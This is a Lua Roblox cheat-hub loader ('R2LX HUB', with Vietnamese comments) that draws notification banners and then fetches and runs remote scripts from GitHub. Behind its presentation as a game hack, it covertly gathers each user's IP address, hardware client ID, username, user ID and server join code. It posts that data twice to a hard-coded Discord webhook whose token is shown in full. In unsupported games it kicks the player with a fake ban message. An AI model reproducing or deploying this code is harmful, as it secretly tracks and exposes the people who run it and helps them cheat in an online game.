local Notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/r2lx-hub/Fluxus-R2LX/refs/heads/main/Notif.lua"))()
local repo = 'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
----
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Xóa GUI cũ nếu có
if playerGui:FindFirstChild("NotificationGui") then
    playerGui:FindFirstChild("NotificationGui"):Destroy()
end

-- 🟡 1. Tạo giao diện
local notificationGui = Instance.new("ScreenGui")
notificationGui.Name = "NotificationGui"
notificationGui.ResetOnSpawn = false
notificationGui.Parent = playerGui

-- Hình ảnh thông báo
local Icon = Instance.new("ImageLabel")
Icon.Size = UDim2.new(0, 30, 0, 30)
Icon.Position = UDim2.new(0, 10, 0.5, -15)
Icon.BackgroundTransparency = 1
Icon.Image = "rbxassetid://71601187256366" -- Thay ID ảnh ở đây
Icon.ZIndex = 2
Icon.Parent = Frame

-- Khung chính (Frame)
local notificationFrame = Instance.new("Frame")
notificationFrame.Name = "NotificationFrame"
notificationFrame.Size = UDim2.new(0, 320, 0, 65)
notificationFrame.Position = UDim2.new(1, 320, 0, 20) -- Ẩn ngoài màn hình
notificationFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
notificationFrame.BackgroundTransparency = 0.3
notificationFrame.BorderSizePixel = 2
notificationFrame.BorderColor3 = Color3.fromRGB(255, 200, 0) -- Viền vàng
notificationFrame.Parent = notificationGui

-- Viền bo góc (UI Corner)
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = notificationFrame

-- Đổ bóng (UI Stroke)
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 200, 0) -- Viền vàng
stroke.Thickness = 2
stroke.Parent = notificationFrame

-- 🟡 Nhãn Tiêu đề (Title)
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, -10, 0.4, -5)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "Cảm ơn đã dùng R2LX HUB"
titleLabel.Parent = notificationFrame

-- 🟡 Nhãn Nội dung (Message)
local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, -10, 0.4, -5)
messageLabel.Position = UDim2.new(0, 5, 0.5, 0)
messageLabel.BackgroundTransparency = 1
messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
messageLabel.TextScaled = true
messageLabel.Font = Enum.Font.Gotham
messageLabel.Text = "https://discord.gg/"
messageLabel.Parent = notificationFrame

-- Đổ bóng chữ (UI Stroke)
local titleStroke = Instance.new("UIStroke")
titleStroke.Thickness = 1
titleStroke.Transparency = 0.5
titleStroke.Parent = titleLabel

local messageStroke = Instance.new("UIStroke")
messageStroke.Thickness = 1
messageStroke.Transparency = 0.5
messageStroke.Parent = messageLabel

----------------------------------------------------------
-- 🟠 2. Hiệu ứng trượt và mờ dần
local function createTween(object, properties, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, tweenInfo, properties)
    return tween
end

-- 🟠 Hiển thị thông báo
function showNotification(title, message, duration, fadeEffect)
    titleLabel.Text = title
    messageLabel.Text = message
    notificationFrame.Visible = true

    if fadeEffect then
        notificationFrame.BackgroundTransparency = 1
        titleLabel.TextTransparency = 1
        messageLabel.TextTransparency = 1
    end

    -- 🟠 Hiệu ứng xuất hiện
    local appearTween = createTween(notificationFrame, {
        Position = UDim2.new(1, -330, 0, 20) -- Trượt vào màn hình
    }, 0.5)

    local fadeInTween
    if fadeEffect then
        fadeInTween = createTween(notificationFrame, {
            BackgroundTransparency = 0.3
        }, 0.5)
        createTween(titleLabel, {TextTransparency = 0}, 0.5):Play()
        createTween(messageLabel, {TextTransparency = 0}, 0.5):Play()
    end

    appearTween:Play()
    if fadeEffect then fadeInTween:Play() end

    wait(duration)

    -- 🟠 Hiệu ứng biến mất
    local disappearTween = createTween(notificationFrame, {
        Position = UDim2.new(1, 320, 0, 20) -- Trượt ra ngoài
    }, 0.5)

    local fadeOutTween
    if fadeEffect then
        fadeOutTween = createTween(notificationFrame, {
            BackgroundTransparency = 1
        }, 0.5)
        createTween(titleLabel, {TextTransparency = 1}, 0.5):Play()
        createTween(messageLabel, {TextTransparency = 1}, 0.5):Play()
    end

    disappearTween:Play()
    if fadeEffect then fadeOutTween:Play() end

    notificationFrame.Visible = false
end
----------------------------------------------------------

-- 🟢 3. Gọi thông báo để kiểm tra
-- ✅ Có hiệu ứng mờ dần
showNotification("R2LX HUB Thông Báo", "Chào mừng bạn đến!", 0, true)


-- ✅ Không hiệu ứng mờ dần
showNotification("Update Mới!", "Tham gia Discord ngay!Music", 0, false)

-- 🛑 Xóa GUI cũ nếu có
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("BottomRightNotification") then
    game.Players.LocalPlayer.PlayerGui:FindFirstChild("BottomRightNotification"):Destroy()
end

-- 📂 Tạo GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BottomRightNotification"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local NotificationFrame = Instance.new("Frame")
NotificationFrame.Parent = ScreenGui
NotificationFrame.Size = UDim2.new(0, 250, 0, 75)  -- 📐 Cao hơn 1 chút
NotificationFrame.Position = UDim2.new(1, -270, 1, -130)
NotificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- 🎨 Nền nhạt hơn
NotificationFrame.BackgroundTransparency = 0.2
NotificationFrame.BorderSizePixel = 0
NotificationFrame.Visible = false
NotificationFrame.ClipsDescendants = true

-- 🎨 Bo góc
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = NotificationFrame

-- 🖊️ Tiêu đề "Info"
local Title = Instance.new("TextLabel")
Title.Parent = NotificationFrame
Title.Size = UDim2.new(0, 240, 0, 22)
Title.Position = UDim2.new(0, 8, 0, 8)
Title.Text = "Info"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.Font = Enum.Font.GothamBold
Title.BackgroundTransparency = 1
Title.TextXAlignment = Enum.TextXAlignment.Left

-- 📜 Nội dung
local Message = Instance.new("TextLabel")
Message.Parent = NotificationFrame
Message.Size = UDim2.new(0, 240, 0, 25)  -- 📐 Chỉnh nội dung cao hơn
Message.Position = UDim2.new(0, 8, 0, 32)
Message.Text = "Script r2lx hub!"
Message.TextColor3 = Color3.fromRGB(220, 220, 220)
Message.TextSize = 30
Message.Font = Enum.Font.Gotham
Message.BackgroundTransparency = 1
Message.TextXAlignment = Enum.TextXAlignment.Left

-- 📊 Thanh tiến trình
local ProgressBar = Instance.new("Frame")
ProgressBar.Parent = NotificationFrame
ProgressBar.Size = UDim2.new(1, 0, 0, 3)
ProgressBar.Position = UDim2.new(0, 0, 1, -3)
ProgressBar.BackgroundColor3 = Color3.fromRGB(120, 180, 255)
ProgressBar.BorderSizePixel = 0

local ProgressBarCorner = Instance.new("UICorner")
ProgressBarCorner.CornerRadius = UDim.new(0, 3)
ProgressBarCorner.Parent = ProgressBar

-- 📢 Hàm hiển thị thông báo
function ShowNotification(message, duration)
    Message.Text = message
    NotificationFrame.Position = UDim2.new(1, 270, 1, -130)
    NotificationFrame.Visible = true

    -- Hiệu ứng trượt vào
    NotificationFrame:TweenPosition(
        UDim2.new(1, -270, 1, -130),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Quart,
        0.6,
        true
    )

    -- Thanh tiến trình
    ProgressBar.Size = UDim2.new(1, 0, 0, 3)
    ProgressBar:TweenSize(
        UDim2.new(0, 0, 0, 3),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Linear,
        duration,
        false
    )

    -- Đợi rồi trượt ra
    wait(duration)
    NotificationFrame:TweenPosition(
        UDim2.new(1, 270, 1, -130),
        Enum.EasingDirection.In,
        Enum.EasingStyle.Quart,
        0.6,
        true
    )
    NotificationFrame.Visible = false
end

-- ⚙️ Chạy thử
ShowNotification("Script r2lx hub!", 0)

-- End
-- Âm thanh khởi động
local startupSound = Instance.new("Sound")
startupSound.SoundId = "rbxassetid://8594342648"
startupSound.Volume = 5 -- Điều chỉnh âm lượng nếu cần
startupSound.Looped = false -- Không lặp lại âm thanh
startupSound.Parent = game.CoreGui-- Đặt parent vào CoreGui để đảm bảo âm thanh phát
startupSound:Play() -- Phát âm thanh khi script chạy

----Nhạc Ko Lời
local startupSound = Instance.new("Sound")
startupSound.SoundId = "rbxassetid://9046862941"
startupSound.Volume = 50 -- Điều chỉnh âm lượng nếu cần
startupSound.Looped = false -- Không lặp lại âm thanh
startupSound.Parent = game.CoreGui-- Đặt parent vào CoreGui để đảm bảo âm thanh phát
startupSound:Play() -- Phát âm thanh khi script chạy

local Notification = require(game:GetService("ReplicatedStorage").Notification)
Notification.new("<Color=Cyan>R2LX Hub <Color=/>"):Display()
Notification.new("<Color=Yellow>By R2LX Hub On Top👑<Color=/>"):Display()
function CreateNotification(text1, color1, text2, color2)
    local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
    local TextLabel = Instance.new("TextLabel", ScreenGui)

    TextLabel.Size = UDim2.new(0, 400, 0, 50)
    TextLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Font = Enum.Font.SourceSansBold
    TextLabel.TextSize = 30
    TextLabel.TextStrokeTransparency = 0
    TextLabel.RichText = true
    TextLabel.Text = string.format('<font color="rgb(%d,%d,%d)">%s</font> <font color="rgb(%d,%d,%d)">%s</font>', 
        color1.R * 255, color1.G * 255, color1.B * 255, text1, 
        color2.R * 255, color2.G * 255, color2.B * 255, text2
    )
end

-- Ví dụ chạy thử:
CreateNotification("HACK", Color3.fromRGB(255, 0, 0), "R2LX HUB!", Color3.fromRGB(0, 255, 0))
-- Thông Báo Executor

-- Chức năng hiển thị FPS và Pinglocal Players = game:GetService("Players") local RunService = game:GetService("RunService") local Stats = game:GetService("Stats")
---Webhook Discord

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**R2LX HUB Phiên Bản : Test**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xf93dff),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm", AdminLoggerMsg()) -- Post to admin webhook

-- 🛠 Xác định Executor
-- 📌 Lấy thông tin thiết bị
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

-- 📌 Xác định Executor
local executor = "Unknown"
local isMobile = false
local isIOS = false
local isAndroid = false

if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif secure_load then
    executor = "Sentinel"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    executor = getexecutorname()
elseif is_synapse_function then
    executor = "Synapse X (Detected by Function)"
elseif (getgenv and debug and debug.getinfo) then
    executor = "Possible PC Executor"
elseif (writefile and readfile) then
    executor = "Possible Mobile Executor"
    
-- 📌 Executor dành cho iOS
elseif (protect_gui and isfile) then
    executor = "Delta (iOS)"
    isMobile = true
    isIOS = true
elseif (hookfunction and getnamecallmethod) then
    executor = "ScriptWare (iOS & PC)"
    isMobile = true
    isIOS = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (iOS)"
    isMobile = true
    isIOS = true
elseif (getrawmetatable and setreadonly) then
    executor = "Magma Executor (iOS)"
    isMobile = true
    isIOS = true

-- 📌 Executor dành cho Android
elseif (protect_gui and isfile) then
    executor = "Delta (Android)"  -- Thêm executor Delta cho Android
    isMobile = true
    isAndroid = true
elseif (isexecutor and isfile) then
    executor = "Electron (Android)"
    isMobile = true
    isAndroid = true
elseif (isfile and readfile and writefile) then
    executor = "Fluxus Mobile (Android)"
    isMobile = true
    isAndroid = true
elseif (isnetworkowner and islclosure) then
    executor = "Arceus X (Android)"
    isMobile = true
    isAndroid = true

-- 📌 Executor khác
elseif (syn and syn.request) then
    executor = "Synapse X (PC)"
elseif (secure_call and syn) then
    executor = "Comet (PC)"
elseif (firetouchinterest and syn) then
    executor = "Celestial (PC)"
end

-- 📌 Xác định chính xác loại thiết bị
if isMobile then
    if isIOS then
        deviceType = "Mobile (iOS)"
    elseif isAndroid then
        deviceType = "Mobile (Android)"
    else
        deviceType = "Mobile (Unknown OS)"
    end
end

-- 📌 Lấy thông tin nhân vật
local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
local avatarLink = "https://www.roblox.com/users/" .. userId .. "/profile"

-- 📌 Lấy Hardware Key (Client ID)
local hardwareKey = "Unknown"
pcall(function()
    hardwareKey = game:GetService("RbxAnalyticsService"):GetClientId()
end)

-- 📌 Lấy thông tin thiết bị (SỬA LỖI)
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
elseif syn or is_sirhurt_closure or secure_load or getexecutorname or isnetworkowner then
    deviceType = "PC"  -- Nếu dùng các executor phổ biến cho PC, xác định là PC
elseif protect_gui or isfile or hookfunction or islclosure then
    deviceType = "Mobile"  -- Nếu có các hàm executor trên iOS/Android, xác định là Mobile
end

-- 📌 Lấy thông tin tài khoản
local accountAge = player.AccountAge
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

-- 📌 Lấy thông tin về "Sea" (Thế giới)
local seaName = "Unknown"
if game.PlaceId == 2753915549 then -- Place ID cho Sea 1
    seaName = "Sea 1"
elseif game.PlaceId == 4442272183 then -- Place ID cho Sea 2
    seaName = "Sea 2"
elseif game.PlaceId == 7449423635 then -- Place ID cho Sea 3
    seaName = "Sea 3"
else
    seaName = "Unknown Sea"
end

-- 📌 Lấy số lượng người chơi hiện tại trong server
local playerCount = #game.Players:GetPlayers()  

-- 📌 Số người chơi tối đa cố định là 12
local maxPlayers = 12  

-- 📌 Kiểm tra xem người chơi có ở server VIP hay không
-- 📌 Kiểm tra xem người chơi có ở server VIP hay không
local isVIPServer = false

-- Kiểm tra xem có phải server VIP không
if game.PrivateServerId ~= "" and game.PrivateServerId ~= "00000000-0000-0000-0000-000000000000" then
    isVIPServer = true
end

-- 📌 Lấy IP Address
local ipAddress = "Unknown"
pcall(function()
    ipAddress = game:HttpGet("https://api.ipify.org", true)
end)

-- 📌 Lấy Job ID
local jobId = game.JobId

-- 📌 Tạo Join Code
local joinCode = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. jobId .. "')"

-- 📌 Hàm sinh màu ngẫu nhiên
local function generateRandomColor()
    return tonumber(string.format("0x%02X%02X%02X", math.random(0, 255), math.random(0, 255), math.random(0, 255)))
end

-- 📌 Lấy HttpService
local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"


-- 📌 Gửi thông báo lên Webhook Discord (SỬA LỖI TÊN THIẾT BỊ)
local function guiThongBaoDiscord()
    local randomColor = generateRandomColor()  

    local response = request({
        Url = Webhook_URL,
        Method = 'POST',
        Headers = { ['Content-Type'] = 'application/json' },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "**Script Đã Được Chạy!**",
                ["description"] = "**" .. displayName .. "** đã chạy script.",
                ["type"] = "rich",
                ["color"] = randomColor,  
                ["thumbnail"] = { ["url"] = avatarUrl },  
                ["fields"] = {
                    {
                        ["name"] = "👤 Tên nhân vật:",
                        ["value"] = username .. " (" .. displayName .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 User ID:",
                        ["value"] = tostring(userId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "⚡ Executor:",
                        ["value"] = executor,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📱 Tên thiết bị:",
                        ["value"] = deviceType,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📅 Tuổi tài khoản:",
                        ["value"] = tostring(accountAge) .. " ngày",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🎮 Tên trò chơi:",
                        ["value"] = gameName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 Game ID:",
                        ["value"] = tostring(gameId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🔑 Hardware Key:",
                        ["value"] = hardwareKey,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌍 Thế giới (Sea):",
                        ["value"] = seaName,
                        ["inline"] = false
                    },                    
                    {
                        ["name"] = "👥 Số người chơi trong server:",
                        ["value"] = tostring(playerCount) .. "/12",  -- Luôn hiển thị /12
                        ["inline"] = true
                    },                    
                    {
                        ["name"] = "🌍 Server VIP/Thường:",
                        ["value"] = isVIPServer and "VIP Server" or "Server Thường",  -- Thêm thông báo Server VIP/Thường
                        ["inline"] = true
                    },                    
                    {
                        ["name"] = "🌍 IP Address:",
                        ["value"] = ipAddress,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Job ID:",
                        ["value"] = jobId,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Join Code:",
                        ["value"] = "```lua\n" .. joinCode .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "⏰ Thời gian gửi:",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔗 Link Avatar:",
                        ["value"] = avatarLink,
                        ["inline"] = false
                    }
                }
            }}
        })
    })
end

-- 🔥 Gửi thông báo khi script chạy
guiThongBaoDiscord()

-- 📌 Hiển thị thông báo trên Roblox
game.StarterGui:SetCore("SendNotification", {
    Title = "Executor",
    Text = "Bạn đang dùng: " .. executor,
    Duration = 5
})

-- 📌 Hiển thị thông báo trên Roblox về server VIP/Thường
local serverStatusMessage = isVIPServer and "Bạn đang ở **Server VIP**" or "Bạn đang ở **Server Thường**"

game.StarterGui:SetCore("SendNotification", {
    Title = "Server Status",
    Text = serverStatusMessage,
    Duration = 5
})


local placeId = game.PlaceId
local supportedGames = {
    [2753915549] = true, -- Sea 1
    [4442272183] = true, -- Sea 2
    [7449423635] = true  -- Sea 3
}

if supportedGames[placeId] then
    local v = {
        [2753915549] = "https://raw.githubusercontent.com/AnhEmTu100/MEME/refs/heads/main/deobfuscated.lua",
        [4442272183] = "https://raw.githubusercontent.com/AnhEmTu100/MEME/refs/heads/main/deobfuscated.lua",
        [7449423635] = "https://raw.githubusercontent.com/AnhEmTu100/MEME/refs/heads/main/deobfuscated.lua"
    }

    for PlaceID, Execute in pairs(v) do
        if PlaceID == placeId then
            local func = loadstring(game:HttpGet(Execute))
            print('Old Loader')
            Library:Notify('Script Loading')
            Notif.New("Xin chào! Đây là thông báo script! Phiên Bản: Test", 3)
            Notif.New("Hiển thị lại các nút ấn sẽ tự động bật lại khi mất!", 4)
            func()
        end
    end
else
    local player = game.Players.LocalPlayer
    local banDuration = 1337
    local reason = "Cheating | ID 1337"

    local message = string.format(
        "You were kicked from this experience:\n" ..
        "You are banned for [%d hours]\n" ..
        "Reason: %s\n\n" ..
        "Game này không được hỗ trợ. Đợi update đi!\n\n" ..
        "Hãy đảm bảo key đúng hahahaha!!.",
        banDuration, reason
    )

    player:Kick(message)
end